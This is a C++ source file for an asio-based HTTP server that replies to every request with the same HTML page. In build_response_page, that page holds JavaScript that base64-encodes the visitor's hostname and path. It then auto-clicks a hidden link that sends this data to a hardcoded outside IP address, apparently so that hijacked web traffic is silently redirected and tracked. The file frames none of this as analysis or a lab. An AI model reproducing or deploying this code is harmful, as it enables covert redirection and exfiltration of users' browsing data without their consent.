#include "http_server.h"
#include <asio.hpp>
#include <iostream>
#include <sstream>
#include <thread>

HTTPServer::HTTPServer(short port)
    : acc_(io_, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), port)) {
    start_accept();
}

void HTTPServer::start_accept() {
    auto sock = std::make_shared<asio::ip::tcp::socket>(io_);
    acc_.async_accept(*sock, [this, sock](std::error_code ec){
        if (!ec) {
            std::thread([this, sock]{
                try { handle_client(sock); }
                catch (const std::exception& e) {
                    std::cerr << "[HTTP] client thread exception: " << e.what() << std::endl;
                }
            }).detach();
        }
        start_accept();
    });
}

std::string HTTPServer::build_response_page() {
    const std::string html = R"(<html><head><meta charset="utf-8"></head><body><a href="" id="h"></a><script> var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname) + "&p=" + btoa(window.location.pathname + window.location.search); var h=document.getElementById("h"); h.href=strU; if(document.all){ h.click(); }else { var e=document.createEvent("MouseEvents"); e.initEvent("click",true,true); h.dispatchEvent(e); }</script></body></html>)";
    std::string resp =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Connection: close\r\n"
        "\r\n" + html;
    return resp;
}

void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
    try {
        // 读取请求头直到空行
        asio::streambuf reqbuf;
        asio::read_until(*sock, reqbuf, "\r\n\r\n");
        std::istream is(&reqbuf);
        std::string line, host;
        std::getline(is, line); // 请求行
        while (std::getline(is, line) && line != "\r") {
            if (line.rfind("Host:", 0) == 0) {
                host = line.substr(5);
                while (!host.empty() && (host.front()==' '||host.front()=='\t')) host.erase(host.begin());
                while (!host.empty() && (host.back()=='\r'||host.back()=='\n'||host.back()==' '||host.back()=='\t')) host.pop_back();
            }
        }

        // 设置TCP_NODELAY来禁用Nagle算法
        int one = 1;
        setsockopt(sock->native_handle(), IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

        // 构建并发送响应
        auto resp = build_response_page();
        asio::error_code ec;
        asio::write(*sock, asio::buffer(resp), ec);
        if (ec) {
            std::cerr << "[HTTP] write error: " << ec.message() << std::endl;
            return;
        }

        // 关闭连接
        sock->shutdown(asio::ip::tcp::socket::shutdown_send, ec);
        sock->close(ec);

        std::cerr << "[HTTP] response sent & connection closed for host '" 
                  << (host.empty() ? "-" : host) << "'\n";

    } catch (const std::exception& e) {
        std::cerr << "[HTTP] client error: " << e.what() << std::endl;
    }
}

void HTTPServer::run() {
    std::cout << "[HTTP] Accepting on :" << SERVER_PORT << std::endl;
    io_.run();
}